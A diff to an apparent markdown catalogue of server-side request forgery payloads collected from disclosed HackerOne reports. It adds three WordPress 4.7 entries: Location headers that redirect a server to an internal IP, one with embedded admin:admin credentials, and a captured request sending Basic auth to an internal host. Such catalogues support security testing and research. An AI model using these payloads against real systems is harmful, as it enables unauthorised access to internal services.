@@ -1,6 +1,6 @@
 # Server-Side Request Forgery
 
-150 payloads from disclosed reports.
+153 payloads from disclosed reports.
 
 ## Server-Side Request Forgery (SSRF) via the image_host GET parameter
 
@@ -1345,6 +1345,17 @@ http://localhost/
 — [SSRF vulnerability in target.com via project import.](https://hackerone.com/reports/215105) · GitLab · [edoverflow](https://hackerone.com/edoverflow)
 
 
+## SSRF via a Location header containing credentials (admin:admin) to force an authenticated request to an internal service.
+
+### `671c6fd1`
+
+```
+Location: http://admin:admin@192.168.0.1:12345
+```
+
+— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)
+
+
 ## SSRF via malicious HLS playlist (M3U) that forces the server's ffmpeg to fetch an external MP4 URL
 
 ### `05bb029c`
@@ -1358,6 +1369,17 @@ http://target.com/2.mp4
 ```
 
 — [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857) · Imgur · [sl1m](https://hackerone.com/sl1m)
+
+
+## SSRF via a malicious Location header redirecting the server to an internal IP address.
+
+### `e92a92b1`
+
+```
+Location: http://192.168.0.1:12345
+```
+
+— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)
 
 
 ## SSRF via malicious Referer header pointing to internal service
@@ -1640,6 +1662,24 @@ By using the JSON api, hitting the */json/list* endpoint, we can see every tabs 
 
 **Parameter:** `name`
 — [\[h1-415 2020\] My writeup on how to retrieve the special secret document](https://hackerone.com/reports/776684) · h1-ctf · [blaklis](https://hackerone.com/blaklis)
+
+
+## SSRF where the attacker-controlled URL causes the server to issue an HTTP request with a Basic‑Auth header to an internal host.
+
+### `3a897c3e`
+
+```
+GET / HTTP/1.1
+Host: 192.168.0.1:12345
+Authorization: Basic YWRtaW46YWRtaW4=
+User-Agent: Press This (WordPress/4.7-RC1);
+Accept: */*
+Accept-Encoding: deflate, gzip
+Referer: http://admin:admin@192.168.0.1:12345/
+Connection: close
+```
+
+— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)
 
 
 ## Stored XSS via script src injection loading external JavaScript
